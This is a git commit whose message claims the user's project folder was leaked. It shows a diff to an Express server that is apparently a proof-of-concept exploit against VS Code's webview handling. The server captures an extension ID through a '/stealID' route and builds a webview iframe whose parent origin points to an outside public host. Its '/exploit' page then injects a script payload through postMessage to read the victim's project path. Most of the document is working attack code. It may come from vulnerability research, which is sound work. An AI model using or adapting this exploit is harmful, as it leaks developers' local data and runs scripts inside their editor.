51848e902b148f2695b92e579c735cb185b371d7
sudistark <sudhanshur705@gmail.com>
2022-08-13 18:02:47 +0530

    Successfully Leaked user project folder

--- code/main.js
+++ code/main.js
@@ -5,45 +5,47 @@ const port = 3000
 let extensionId
 
 
-app.use('/stealID',function (req, res, next) {
-    extensionId = req.headers.origin.split('/')[2];
-    console.log("Middleware called")
-    next();
+app.use('/stealID', function(req, res, next) {
+  extensionId = req.headers.origin.split('/')[2];
+  console.log("Middleware called")
+  next();
 });
 
 app.get('/stealID', (req, res) => {
-    console.log(extensionId)
-    createHTML()
-    res.send('ID stolen')
+  console.log(extensionId)
+  createHTML()
+  res.send('ID stolen')
 })
 
 
-var publicUrl = "https://dd4c-2409-4063-6e8b-521b-20f6-8d91-93d7-bfd0.ngrok.io"
+var publicUrl = "https://felineintelligentbytes.kacegi6947.repl.co"
 
-function createHTML(){
+function createHTML() {
 
-srcUrl = `vscode-webview://${extensionId}/index.html?id=${extensionId}&amp;swVersion=2&amp;extensionId=vscode.markdown-language-features&amp;platform=electron&amp;vscode-resource-base-authority=vscode-resource.vscode-webview.net&amp;parentOrigin=${publicUrl}`
+  srcUrl = `vscode-webview://${extensionId}/index.html?id=${extensionId}&amp;swVersion=2&amp;extensionId=vscode.markdown-language-features&amp;platform=electron&amp;vscode-resource-base-authority=vscode-resource.vscode-webview.net&amp;parentOrigin=${publicUrl}`
 
+payload = `<script>window.top.frames[0].onmessage=a=>{console.log(a);try{loc=JSON.parse(a.data.args.state).resource,console.log(loc)}catch(b){console.log(b)}},window.top.postMessage({target:'${extensionId}',channel:'do-reload'},'*')`
 
 htmlPOC = `
 <script>
+
 function sendMessage(){
     //send post message to frame
 
-    window.frames[0].postMessage({channel:"content",args:{contents:"<img src=x onerror=alert(origin) />",options:{allowScripts:true}}},"*");
+    window.frames[0].postMessage({channel:"content",args:{contents:"${payload}",options:{allowScripts:true}}},"*");
 }
-</script>
+<\/script>
 <iframe src="${srcUrl}" onload=sendMessage()>
 `
 }
 
 
 app.get('/exploit', (req, res) => {
-    res.send(htmlPOC)
+  res.send(htmlPOC)
 })
 
-app.get('/',(req,res)=>{
-    res.send("test")
+app.get('/', (req, res) => {
+  res.send("testss")
 })
 
 app.listen(port, () => {
